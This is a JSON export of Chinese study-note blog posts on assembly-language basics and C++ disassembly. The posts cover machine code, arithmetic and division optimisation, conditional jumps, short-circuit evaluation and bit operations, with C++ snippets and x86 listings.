汇编语言的诞生","date":"2023-10-31T09:40:27.000Z","updated":"2024-01-25T13:01:38.570Z","comments":true,"path":"2023/10/31/汇编学习-1.2 汇编语言的诞生/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-1.2%20%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%9A%84%E8%AF%9E%E7%94%9F/","excerpt":"","text":"1.2 汇编语言的诞生上一节我们知道了机器语言带来的麻烦，于是汇编语言诞生了 汇编指令和机器指令的差别在于指令的表达方式上，汇编指令是机器指令便于记忆读写的书写格式，例如：机器指令 1000100111011000 表示把寄存器 bx 的内容送到 ax 中，汇编指令写成 mov ax,bx 可以看到，这样的写法与人类语言更加接近，便于阅读和记忆 关于寄存器： 简单的讲就是 CPU 中可以存储数据的器件，一个 CPU 中有多个寄存器，ax 是其中一个寄存器的代号，bx 是另一个寄存器的代号。详细的后面会讲到 所以，程序员们就开始用汇编指令编写源程序。可是，计算机能读懂的只有机器指令，那么如何让计算机执行程序员用汇编指令编写的程序呢？这时，就需要一个能够将汇编指令转换成机器指令的翻译程序，这样的程序被称为编译器。程序员用汇编语言写出源程序，再用汇编编译器将其编译为机器码，有计算机最终执行。 ![用汇编语言编写程序的工作过程](&#x2F;images&#x2F;汇编学习-1.2 汇编语言的诞生&#x2F;image-2-1024x218.png)","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"1、基础知识","slug":"汇编语言学习/1、基础知识","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/1%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"汇编学习-1.1机器语言","slug":"汇编学习-1.1 机器语言","date":"2023-10-31T09:38:27.000Z","updated":"2024-01-25T13:01:41.611Z","comments":true,"path":"2023/10/31/汇编学习-1.1 机器语言/","link":"","permalink":"http://example.com/2023/10/31/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-1.1%20%E6%9C%BA%E5%99%A8%E8%AF%AD%E8%A8%80/","excerpt":"","text":"1.1 机器语言在学习汇编语言之前，我们要先了解一下机器语言。机器语言是机器指令的集合，机器指令就是一台机器可以正确执行的命令。电子计算机的机器指令是一列二进制数字，计算机将其转变为一列高低电平，使计算机的电子器件收到驱动，进行运算、运行。 刚刚说到的计算机，其实指的是可以执行机器指令、进行运算的机器。之前是这么称呼计算机的，现在，在常用的 PC 计算机里，有一个芯片就可以完成上面所说的计算机的功能，这个芯片就是我们常说的 CPU （中央处理单元），CPU 是一种微处理单元。 而每一种微处理单元，由于硬件设计和内部结构的不同，就需要用不同的电平脉冲来控制，使其可以工作。所以每一种微处理器都有自己的机器指令集，也就是机器语言。 我们知道，在很早之前，没有什么高级编程语言，比如说 C 语言，Python 语言，早期的程序设计均使用机器语言，程序员们用 0 、1 数字编成的程序代码打在纸带或卡片上，1 代表的是打孔，0 代表不打孔，再将程序通过纸带机或者卡片机输入计算机，就可以进行运算。 但是，机器码并非想象中的那么简单易懂，我们来看一下《汇编语言》- 王爽 里的一个例子： 应用 8086CPU 完成运算 s=768+12288-1280，机器码如下：101100000000000000000011000001010000000000110000001011010000000000000101假如将程序错写成一下这样，请读者找出错误101100000000000000000011000001010000000000110000000101101000000000000101 这里我们就可以看出，机器码的晦涩难懂，而且不易查错。所以，要书写和阅读机器码程序不是一件简单的工作，要记住所有抽象的二进制码。上面只是一个非常简单的运算，如果要写一个更有用的程序，情况又会怎么样呢？可想而知，如果程序里有一个 “1” 被误写为 “0”，或者少写了一个 “1”，又如何去查找呢？ 《汇编语言》- 王爽 例子中的错误： 第三行第一个 1 前多了个 0，第四个 1 后少了个 0","categories":[{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"1、基础知识","slug":"汇编语言学习/1、基础知识","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/1%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"C++反汇编与逆向分析技术揭秘-3.3位运算","slug":"C++反汇编与逆向分析技术揭秘-3.3 位运算","date":"2023-10-31T09:28:28.000Z","updated":"2023-10-31T09:56:11.049Z","comments":true,"path":"2023/10/31/C++反汇编与逆向分析技术揭秘-3.3 位运算/","link":"","permalink":"http://example.com/2023/10/31/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-3.3%20%E4%BD%8D%E8%BF%90%E7%AE%97/","excerpt":"","text":"3.3 位运算二进制数据的运算成为位运算，位运算操作有： “&lt;&lt;”：左移运算，最高位左移到 CF 中，最低位补零 “&gt;&gt;”：右移运算，最高位不变，最低位右移到 CF 中 “ ‘ “：位或运算，在两个数的相同位上，只要有一个 1，则结果为 1 “ &amp; “：位与运算，在两个数的相同位上，只有同时为 1 时，结果才为 1 “ ^ “：异或运算，在两个数的相同位上，两个值相同则为 0 ，不同则为 1 “ ~ “：取反运算，将操作数每一位上的 1 变为 0 ，0 变为 1 位运算在程序算法中被大量使用，如不可逆算法 md5，就是通过大量位运算来完成的。如何使一个数不可逆转呢？利用位运算就可以达到目的，比如说呢，x &amp; 0 &#x3D; 0 ,但是我们并不能通过结果来逆推 x 的值的。 由于大多数位运算会导致数据信息的丢失（其中 取反” ~ “ 和 异或” ^ “ 是可以逆推的），所以，在知道原算法的前提下，使用逆转算法是无法计算出原数据的。在算术运算中，编译器会将各种运算转换成位运算，因此掌握位运算对于学会算法识别是一件非常重要的事。 接下来我们来看看，位运算符号又是如何转换成汇编代码的呢 12345678910111213141516171819int main() //C++ 源码说明：位运算&#123; int argc = 1; argc = argc &lt;&lt; 3; //将变量 argc 左移 3 位 argc = argc &gt;&gt; 5; //将变量 argc 右移 5 位 argc = argc &#x27; 0xFFFF0000; //将变量 argc 与 0xFFFF0000 做位或运算 argc = argc &amp; 0xFFFF0000; //将变量 argc 与 0xFFFF0000 做位与运算 argc = argc ^ 0xFFFF0000; //将变量 argc 与 0xFFFF0000 做异或运算 argc = ~argc; //将变量 argc 做按位取反运算&#125; 我们来看看汇编代码是什么 ![](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-3.3 位运算&#x2F;1image.png) 上面展示了有符号数的位运算，对于无符号数而言，转换的位运算指令将会发生转变，我们也来看看 1234567891011int main() //无符号位运算&#123; unsigned int argc = 1; argc = argc &lt;&lt; 3; //将变量 argc 左移 3 位 argc = argc &gt;&gt; 5; //将变量 argc 右移 5 位&#125; ![](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-3.3 位运算&#x2F;1image-1.png) 可以看到，无符号数的左移运算和有符号数的是一样的，都不需要考虑到符号位。但右移运算则有变化，有符号数对应的指令为 sar ，可以保留符号位，而无符号数不需要符号位，所以直接使用 shr 将最高位补 0","categories":[{"name":"C++反汇编与逆向分析技术揭秘","slug":"C-反汇编与逆向分析技术揭秘","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/"},{"name":"3、观察各种表达式的求值过程","slug":"C-反汇编与逆向分析技术揭秘/3、观察各种表达式的求值过程","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/3%E3%80%81%E8%A7%82%E5%AF%9F%E5%90%84%E7%A7%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E6%B1%82%E5%80%BC%E8%BF%87%E7%A8%8B/"}],"tags":[]},{"title":"C++反汇编与逆向分析技术揭秘-3.2关系运算和逻辑运算","slug":"C++反汇编与逆向分析技术揭秘-3.2 关系运算和逻辑运算","date":"2023-10-31T09:28:04.000Z","updated":"2023-10-31T09:55:51.108Z","comments":true,"path":"2023/10/31/C++反汇编与逆向分析技术揭秘-3.2 关系运算和逻辑运算/","link":"","permalink":"http://example.com/2023/10/31/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-3.2%20%E5%85%B3%E7%B3%BB%E8%BF%90%E7%AE%97%E5%92%8C%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97/","excerpt":"","text":"3.2 关系运算和逻辑运算关系运算用于判断两者之间的关系，如等于、不等于、大于等于、小于等于、大于和小于，对应的符号分别为”&#x3D;&#x3D;”、”!&#x3D;”、 “&gt;&#x3D;”、”&lt;&#x3D;”、”&gt;”、”&lt;”，关系运算的作用是比较关系运算符左右两边的操作数的值，得出一个判断结果:真或假。逻辑运算用于判定两个逻辑值之间的依赖关系，如或、与、非，对应的符号有”‘’”、”&amp;&amp;”、”!” ， 逻辑运算也是可以组合的，执行顺序和关系运算相同。 或 运算：比较运算符”‘’”左右的语句的结果，如果有一个值为真，则返回真值；如果都为假，则返回假值 与 运算：比较运算符”&amp;&amp;”左右的语句的结果，如果有一个值为假，则返回假值；如果都为真值，则返回真值 非 运算：改变运算符 “!” 后面的语句的真假结果，如果该语句的结果为真值，则返回假值；如果为假值，则返回真值 3.2.1 关系运算和条件跳转的对应如何选择条件跳转指令，需要根据所使用到的关系运算，不同的关系运算对应的条件跳转指令也不同 下面我们来看看各种关系对应的条件跳转指令 指令助记符检查标记位说明JZZF==1等于 0 则跳转JEZF==1相等则跳转JNZZF==0不等于 0 则跳转JNEZF==0不相等则跳转JSSF==1符号为 负 则跳转JNSSF==0符号为 正 则跳转JP/JPEPF==1\"1\"的个数为偶数则跳转JPN/JPOPF==0\"1\"的个数为奇数则跳转JOOF==1溢出则跳转JNOOF==0无溢出则跳转JCCF==1进位则跳转JBCF==1小于则跳转（无符号比较）JNAECF==1不大于等于则跳转JNCCF==0无进位则跳转JNBCF==0不小于则跳转JAECF==0大于等于则跳转JBECF==1 或 ZF==1小于等于则跳转JNACF==1 或 ZF==1不大于则跳转JNBECF==0 或 ZF==0不小于等于则跳转JACF==0 或 ZF==0大于则跳转（无符号比较）JLSF != OF小于则跳转（有符号比较）JNGESF != OF不大于等于则跳转JNLSF == OF不小于则跳转JGESF == OF大于等于则跳转JLEZF != OF 或 ZF==1小于等于则跳转JNGZF != OF 或 ZF==1不大于则跳转JNLESF == OF 或 ZF==0不小于等于则跳转JGSF == OF 或 ZF==0大于则跳转（有符号比较） 其中，有一定的规律，比如 A 和 G 表示的是大于，比如说 JA 和 JG；B 和 L 表示的是小于，比如说 JB 和 JL；E 表示的是相等，比如说 JE 是相等则跳转，JGE/JAE 是大于等于则跳转，JLE/JBE 是小于等于则跳转；N 表示的是 不 ，比如说 JNE 是不相等，JNG/JNA 是不大于则跳转，JNGE/JNAE 是不大于等于则跳转...... 在通常情况下，这些条件跳转指令都与 CMP 和 TEST 匹配出现，但条件跳转指令检查的是标记位。因此，在有修改标记位的代码处，也可以根据需要使用条件跳转指令来修改程序流程 3.2.2 表达式短路表达式短路通过 “逻辑与” 运算 和 “逻辑或” 运算 使语句根据条件在执行时发生中断，从而不予执行后面的语句。如何利用表达式短路来实现语句中断呢？根据逻辑与和逻辑或运算的特性，如果是与运算，当运算符左边的语句块为假值时，则直接返回假值，不执行右边的语句；如果是或运算，当运算符左边的语句块为真值时，直接返回真值，不执行右边的语句块 我们将进一步学习和理解表达式短路的构成 ![](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-3.2 关系运算和逻辑运算&#x2F;image-165.png) //当 num 等于 0 时，逻辑与 运算符左边的值为假，将不会执行右边语句 num && (num += Accumulation(num - 1)); 00007FF613B1177E cmp dword ptr [num],0 //这里为短路模式汇编代码，比较变量 num 是否等于 0 00007FF613B11785 je Accumulation+46h (07FF613B117A6h) //通过 je 跳转，检查 ZF 标记位等于 1 跳转 00007FF613B11787 mov eax,dword ptr [num] //跳转失败，进入递归调用 00007FF613B1178D dec eax 00007FF613B1178F mov ecx,eax //对变量减 1，并将结果转移 00007FF613B11791 call Accumulation (07FF613B111AEh) 00007FF613B11796 mov ecx,dword ptr [num] 00007FF613B1179C add ecx,eax 00007FF613B1179E mov eax,ecx 00007FF613B117A0 mov dword ptr [num],eax //继续调用自己，形成递归 return num; 00007FF613B117A6 mov eax,dword ptr [num] 在上面的实例中，通过递归函数 Accumulation 完成了整数累加和计算，在递归函数的构成中，必须要有一个出口，本实例选择了逻辑运算”&amp;&amp;”来制造递归函数的出口。通过使用 CMP 指令来检查运算符左边的语句是否为假值，根据跳转指令 JE 来决定是否跳过程序流程。当变量 num 为假时，JE 成功跳转，跳过递归函数调用，程序流程将会执行到出口 return 处 逻辑运算” ‘’ “虽然与逻辑运算”&amp;&amp;”有些不同，但它们的构成原理相同，只需稍作修改就可以解决这一类型的问题。将 逻辑与 运算修改为 逻辑或 运算来实现表达式短路 //当 num 等于 0 时，逻辑或 运算符左边的值为真，将不会执行右边语句 (num == 0) '' (num += Accumulation(num - 1)); //使用逻辑或 运算造成的表达式短路，生成的反汇编代码与使用逻辑与 时是样的 00007FF67B54177E cmp dword ptr [num],0 00007FF67B541785 je Accumulation+46h (07FF67B5417A6h) 00007FF67B541787 mov eax,dword ptr [num] 00007FF67B54178D dec eax 00007FF67B54178F mov ecx,eax 00007FF67B541791 call Accumulation (07FF67B5411AEh) 00007FF67B541796 mov ecx,dword ptr [num] 00007FF67B54179C add ecx,eax 00007FF67B54179E mov eax,ecx 00007FF67B5417A0 mov dword ptr [num],eax return num; 00007FF67B5417A6 mov eax,dword ptr [num] 我们对比一下可以发现，两种短路表达式编译为相同的汇编代码，虽然使用的逻辑运算符不同，但在这两种情况下，运算符的左边的语句块都是在与 0 值作比较，而且判定的结果都是等于 0 时不执行运算符右边的语句块，所以就变成了相同的汇编代码 转换成汇编代码后，通过比较后跳转来实现短路，这种结构实质上呢，就是分支结构，在反汇编代码中时没有表达式短路的（虽然这节标题叫作表达式短路），我们能够看到的都是分支结构，至于什么是分支结构我们之后会详细了解的 3.2.3 条件表达式条件表达式，也就是三目运算 表达式 1 ? 表达式 2 : 表达式 3 我们来复习一下：如果表达式 1 是真值，那么执行表达式 2；如果是假值，那么执行表达式 3 条件表达式也属于表达式的一种，所以表达式 1，表达式 2，表达式 3 都可以套用到条件表达式中，条件表达式被套用后，其执行顺序依然是由左向右，自内向外 条件表达式的构成应该是先判断再选择，但是，编译器并不一定会按照这种方式进行编译，当表达式 2 与表达式 3 都为常量时，条件表达式可以被优化；而当表达式 2 或表达式 3 中的一个为变量时，条件表达式不可以被优化，会转换成分支结构；当表达式 1 为一个常量值时，编译器会在编译过程得到答案，将不会有条件表达式存在 编译器有四种条件表达式的转换方案 表达式 1 为简单比较，而表达式 2 和表达式 3 两者的差值等于 1 表达式 1 为简单比较，而表达式 2 和表达式 3 两者的差值大于 1 表达式 1 为复杂比较，而表达式 2 和表达式 3 两者的差值大于 1 表达式 2 和表达式 3 有一个是变量，于是没有优化 我们可以自己通过反汇编形式对比这 4 种转换方案，找出它们的特征，分析它们之间的区别","categories":[{"name":"C++反汇编与逆向分析技术揭秘","slug":"C-反汇编与逆向分析技术揭秘","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/"},{"name":"3、观察各种表达式的求值过程","slug":"C-反汇编与逆向分析技术揭秘/3、观察各种表达式的求值过程","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/3%E3%80%81%E8%A7%82%E5%AF%9F%E5%90%84%E7%A7%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E6%B1%82%E5%80%BC%E8%BF%87%E7%A8%8B/"}],"tags":[]},{"title":"C++反汇编与逆向分析技术揭秘-3.1算术运算和赋值","slug":"C++反汇编与逆向分析技术揭秘-3.1 算术运算和赋值","date":"2023-10-31T09:27:44.000Z","updated":"2023-10-31T09:55:27.117Z","comments":true,"path":"2023/10/31/C++反汇编与逆向分析技术揭秘-3.1 算术运算和赋值/","link":"","permalink":"http://example.com/2023/10/31/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-3.1%20%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E5%92%8C%E8%B5%8B%E5%80%BC/","excerpt":"","text":"3.1 算术运算和赋值 本节内容稍长，爱护眼睛，望周知 Table of Contents 3.1.1 各种算术运算的工作方式 3.1.1.1 加法 ODebug ORelease ▲常量扩散 ▲常量折叠 3.1.1.2 减法 3.1.1.3 乘法 3.1.1.4 除法 O除法计算约定 O对整数除法的优化 ▲除数为 2 的幂 ▲除数为非 2 的幂 ▲除数为负的 2 的幂 ▲除数为负的非 2 的幂 ▲除法优化的原则 3.1.2 算术结果溢出 3.1.3 自增与自减 算术运算是指加法、减法、乘法、除法这四种数学运算，也称为四则运算。我们知道，数学上也有四则运算，那计算机上的四则运算和数学上的有什么不同呢？ 首先，赋值运算类似于数学中的”等于”，是将一个内存单元中的数据传递到另一个内存空间中。由于内存没有处理器那样的控制能力，各个内存单元之间是无法直接传递数据的，所以必须通过处理器访问并中转，以实现两个内存单元间的数据传输。 1234567int main()&#123; int a = 10; //这里的等号&#x27;=&#x27;就是赋值运算，将10赋值给变量a int b; b = a; //这里将变量a 的值赋值给变量b ，而变量a 所在的内存单元中的数据是 10，所以传递到变量b 的内存单元后，变量b 表示的就是 10&#125; 在 C++ 中，算术运算于其他传递计算结果的代码组合后才能被视为一条有效的语句，也就是说算术运算单独存在是没有意义的，因为单独的算术运算虽然可以编译通过，但是不会生成代码，就像你有炊具但是没有食材，最后是做不出饭菜的。不过，因为只进行计算而没有 传递结果的运算会被编译器视为无效语句，与空语句等价，所以不会对程序结果有任何结果 3.1.1 各种算术运算的工作方式3.1.1.1 加法加法运算对应的汇编指令为 ADD，也就是英文中的 ‘add’ ，翻译过来就是添加。在执行加法运算的时候，针对不同的操作数，转换的指令也会不同，而编译器会根据优化方案选择最佳的匹配方案。一般 C++ 最常用的优化方案是下面这两种： 生成文件占用空间最小 执行效率最快 本节内容我们来对比和分析一下Debug编译选项组与Release编译选项组这两个选项对各种计算产生的目标代码方案。 Debug在使用Debug编译选项组的时候，C++产生的目标汇编代码会和源码一一对应： ![](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-3.1 算术运算和赋值&#x2F;image-20221104144856347.png) 现在我们来分析一下Debug编译选项组下编译的汇编代码： 首先我们先是定义了变量 number_one 和变量 number_two ，我们可以看到编译器是用 mov 将数 0 传入 number_one 所在的地址中，对于 number_two 也是同理 然后是变量 + 常量的运算，我们可以看到，编译器将放在 number_one 地址处的数据先是用 mov 放到了 eax 中，然后对 eax 执行加 1 运算（在汇编中，inc 的作用是将指定的操作数的内容加1，再将结果送回到该操作数），最后将结果放回变量 number_one 中，完成加法运算 接下来是变量 + 变量的运算，由上面的C++源码对比可以看出，编译器先使用 eax 存放变量 number_one，然后使用 ecx 存放变量 number_two，再将 eax 的数据加到 ecx 里，完成后将 ecx 的数据转移到 eax （eax 原本的数据将会被覆盖掉），最后再将 eax 的数据存入变量 number_two 的地址处。这样就完成了number_three &#x3D; number_one + number_two 的运算 其中 eax 、ecx 是寄存器 ReleaseC++ 中，很多编译器的Release 编译选项组的默认选项是第二种方案–执行效率优先 在这种方案下，编译出来的汇编代码将会有较大的变化。因为其遵循效率优先，所以编译器会将无用代码去除，并将可合并代码进行归并处理。比如连续两次给同一个变量赋值，它会将第一次赋值给省去，因为在其后又重新对其进行了赋值操作，而且在此之前没有对该变量的任何访问，所以编译器判定此句代码是被删除的。 首先，我们先了解两个关于优化的概念。在编译过程中，编译器常常会采用”常量传播”和”常量折叠”这样的方案对代码中的变量与常量进行优化 常量传播将编译期间可计算出结果的变量转化成变量，这样就减少了变量的使用，比如说： 12345void main()&#123; int nVar = 1; printf(&quot;nVarOne = %d \\r\\n&quot;,nVar);&#125; 我们知道，上面的变量 nVar 是一个在编译期间可以计算出结果的变量。所以，在程序中所有引用到 nVar 的地方都可以直接用常量 1来代替，这样代码就可以变成下面这样： 1234void main()&#123; printf(&quot;nVarOne = %d \\r\\n&quot;,1);&#125; 常量折叠当计算公式中出现多个常量进行计算的时候，且编译器可以在编译期间计算出结果时，这样所有的常量计算都将被计算结果代替（个人觉得这个大多数时候是没什么用的，因为我们写代码的时候一般不会闲着没事把数拆开） 12345void main()&#123; int nVar = 1 + 5 - 3 * 6; printf(&quot;nVarOne = %d \\r\\n&quot;,nVar);&#125; 这个时候就不会生成计算指令，因为”1 + 5 - 3 * 6 “的值是可以在编译过程中计算出来的，所以编译器会先计算出”1 + 5 - 3 * 6 “的结果，也就是 -12，然后将数值 -12 替换掉原表达式 12345void main()&#123; int nVar = -12; printf(&quot;nVarOne = %d \\r\\n&quot;,nVar);&#125; 接下来我们可以再使用”常量传播” 1234void main()&#123; printf(&quot;nVarOne = %d \\r\\n&quot;,-12);&#125; 3.1.1.2 减法减法运算对应于汇编指令 sub，也就是英文中的”subtraction”的缩写。我们知道，计算机只会做加法，但是可以通过补码转换，将减法转变为加法的形式来完成运算 我们先来浅浅学习一下将减法转变为加法的过程： 设有二进制数 Y ,其反码记为 Y（ 反 ），假定其二进制长度为8位，有： Y + Y（ 反 ）&#x3D; 1111 1111B Y + Y（ 反 ）+ 1 &#x3D; 0 （ 进位丢失 ） 根据以上公式从，可得： Y（ 反 ） + 1 &#x3D; 0 - Y Y（ 反 ） + 1 &#x3D; - Y Y（ 补 ） &#x3D; - Y 这就是为什么负数的补码可以简化为取反加 1 的原因 比如，7 - 4 可以转换成： 7 +（ 0 - 4 ）~ 7 +（ 4（ 反 ）+ 1 ）~ 7 + 4（ 补 ） 有了这个特性，所有的减法运算就都可以转换成加法运算了 而减法运算的工作方式与加法运算的基本一致，就不赘述了 3.1.1.3 乘法乘法运算对应的汇编指令有两种： 有符号 imul 无符号 mul 由于乘法指令的执行周期较长，在编译过程中，编译器会先尝试将乘法转换为加法，或者使用移位等周期较短的指令，如果它们都不可以转换的时候，才会使用乘法指令。 我们可以继续用Debug编译选项组来对比C++源码和对应的汇编代码 ![](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-3.1 算术运算和赋值&#x2F;image-1.png) 我们可以看到，有符号数乘以常量值，且这个常量非2的幂，会直接使用有符号乘法 imul 指令。而当常量值为 2 的幂时，编译器会采用执行周期短的左移运算来代替执行周期长的乘法指令。当常值为 2 的幂时，编译器会采用执行周期短的左移运算来代替执行周期长的乘法指令。 这是因为，任何十进制数都可以转换成二进制数来表示，在二进制数中乘以2就等同于所有位依次向左移动1 位。如十进制数3的二进制数为 0011，3乘以 2 后等于 6，6 转换成二进制数为 0110。 而当乘数和被乘数同时都是未知变量时，则无法套用优化方案。这时编译器不会优化处理，将直接使用乘法指令完成乘法计算。 我们发现，两常量相乘时，会先在编译期间计算出相乘的结果，再将表达式转换为常量值 在上例中，乘法运算与加法运算的结合运算，编译器采用 LEA 指令来处理。在代码中，lea 语句 的目的并不是取地址。如果这种组合运算中的乘数不等于 2、4、8 的时候，组合运算会有些许不同 ![](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-3.1 算术运算和赋值&#x2F;image-4.png) 我们可以看到，编译器会直接先拆分，然后再进行运算 而两变量相乘的时候，会直接使用有符号乘法指令 再者，无符号数乘法的原理与之相同，我们可以自己思考一下 3.1.1.4 除法除法计算约定除法运算对应的汇编指令分有符号 idiv 和无符号 div 两种。除法指令的执行周期较长，效率也较低，所以编译器想尽办法用其他运算指令代替除法指令。C++ 中的除法和数学中的除法不同。在 C++ 中，除法运算不保留余数，有专门求取余数的运算 ( 运算符为 % )，也称之为取模运算。对于整数除法，C++ 的规则是仅仅保留整数部分，小数部分完全舍弃。 我们先讨论一下除法计算的相关约定。以下讨论的除法是”计算机整数除法”，我们使用 C 语言中的 a&#x2F;b 表示除法关系。在 C 语言中，两个无符号整数相除，结果依然是无符号的;两个有符号整数相除，结果则是有符号的;如果有符号数和无符号数混除，其结果则是无符号的，有符号数的最高位 ( 符号位 ) 被作为数据位对待,然后作为无符号数参与计算。 对于除法而言，计算机面临着如何处理小数部分的问题。在数学意义上，7&#x2F;2&#x3D; 3.5，而对于计算机而言，整数除法的结果必须为整数。对于3.5这样的数值，计算机取整数部分的方式不止一种，下面来介绍三种取整方式： 向下取整： 所谓对 x 向下取整，就是往 -∞ 方向也就是往小的方向，取最接近 x 的整数值，换言之也就是取得不大于 x 的最大整数，例如，+3.5 向下取整得到3，-3.5向下取整得到-4。在数学描述中，⌊ x ⌋ 表示的就是对 x 向下取整。在标准 C 语言的 math.h 中，定义了 floor 函数，其作用就是向下取整，也有人称之为**”地板取整”**。向下取整的除法，当除数为 2 的幂时，可以直接用带符号右移指令( sar ) 来完成。但是，向下取整存在一个问题：那就是 ⌊ - a &#x2F; b ⌋ ≠ - ⌊ a &#x2F; b ⌋，比如说 ⌊ -1 &#x2F; 2 ⌋ 是 -1，而 -⌊ 1 &#x2F; 2 ⌋ 却是 0（假设 a &#x2F; b 不为整数） 向上取整 所谓对 x 向上取整，就是往 +∞ 方向也就是往大的方向，取最接近 x 的整数值，换言之也就是取得不小于 x 的最小整数。例如，+3.5 向上取整得到 4 ，-3.5 向上取整得到 -3。在数学描述中，⌈ x ⌉ 表示对x 向上取整。在标准 C 语言的 math.h 中有定义 ceil 函数，其作用就是向上取整，也有人称之为**”天花板取整”**。向上取整也存在一个问题：也是 ⌈ - a &#x2F; b ⌉ ≠ - ⌈ a &#x2F; b ⌉，比如 ⌈ -1 &#x2F; 2 ⌉ 是 0，而 -⌈ 1 &#x2F; 2 ⌉ 却是 -1（假设 a &#x2F; b 不为整数） 向 0 取整 所谓对 x 向零取整，就是往 0 方向，取最接近 x 的整数值，换而言之也就是放弃小数部分。举例说明，+3.5 向零取整得到 3，-3.5 向零取整得到 -3。在数学描述中，[ x ] 表示对 x向零取整。在C语言和其他多数高级语言中，对整数除法规定为向零取整。也有人称这种取整方法为**”截断除法”** 对整数除法的优化如果除数是变量，则只能使用除法指令（这和两变量相乘很相似）如果除数为常量，就有了优化的余地，根据除数值的相关特性，编译器有对应的处理方式 除数为 2 的幂我们知道，在乘法里，如果常值为 2 的幂时，编译器会采用执行周期短的左移运算来代替执行周期长的乘法指令，那么在除法运算里也是类似的：在C语言中，有符号除法的除法规则是向 0 取整，对有符号数做右移运算，编译后使用的指令为 sar，相当于向下取整 比如说，4 &#x2F; 2 等价于 4 &gt;&gt; 1，结果就是 2（ ‘ &gt;&gt; ‘ 的意思是右移，比如说 4 的二进制码是 0100，右移就是 0010，也就是 2 了）如果是 5 &#x2F; 2 ，也就是 5 &gt;&gt; 1，结果还是 2（ 5 的二进制码是 0101，右移就是 0010，也就是 2 ）这也是我们在 C 语言中整型用除法时取整的原理 除数为非 2 的幂由于除法指令的周期比乘法指令周期长很多，因此编译器会用周期较短的乘法和其他指令代替除法。我们来看看数学证明 设 x 为被除数变量，o 为某一常量，则有: x &#x2F; o &#x3D; x * ( 1 &#x2F; o ) &#x3D; x * ( 2n &#x2F; o ) * ( 1 &#x2F; 2n ) 由于 o 为常量，且 2n 的取值由编译器选择，所以 ( 2n &#x2F; o ) 的值在编译期间可以计算出来，一般来说，n 的取值都大于等于32， 这样就可以直接调整使用乘法结果的高位，也就是说 ( 2n &#x2F; o ) 是一个编译期间先行计算的常量值，这个值通常被称为 Magic Number 我们用 M 代表 ( 2n &#x2F; o )，那么就有 x &#x2F; o &#x3D; x * ( 1 &#x2F; o ) &#x3D; x * ( 2n &#x2F; o ) * ( 1 &#x2F; 2n ) &#x3D; ( x * M ) * ( 1 &#x2F; 2n ) 我们再用 K 代表 ( x * M )，那么就有 K * ( 1 &#x2F; 2n ) &#x3D; K &#x2F; 2n 这样除数不就变成了 2 的幂了吗，就是 K &gt;&gt; n 然而除法运算还有更加深奥的方面没有研究，比如 ( 2n &#x2F; o ) 的 n 次方的大小问题，这里就先不深究了 除数为负的 2 的幂有了先前学习的基础，我们知道 sar 是右移指令，其实，除数为负的 2 的幂的除法和除数为 2 的幂的除法很相似，如果我们用 Release 编译选项组查看汇编代码，发现里面多了一个 neg 指令，其实这个 neg 指令相当于取负，其他的和除数为 2 的幂的除法基本一致 除数为负的非 2 的幂我们知道，在除数为非 2 的幂的除法中，x &#x2F; o &#x3D; x * ( 1 &#x2F; o ) &#x3D; x * ( 2n &#x2F; o ) * ( 1 &#x2F; 2n ) &#x3D; x * M * ( 1 &#x2F; 2n ) 那么在除数为负的非 2 的幂的除法中，就是 x &#x2F; ( -o ) &#x3D; x * ( -1 &#x2F; o ) &#x3D; x * ( -2n &#x2F; o ) * ( 1 &#x2F; 2n ) &#x3D; x * ( -M ) * ( 1 &#x2F; 2n 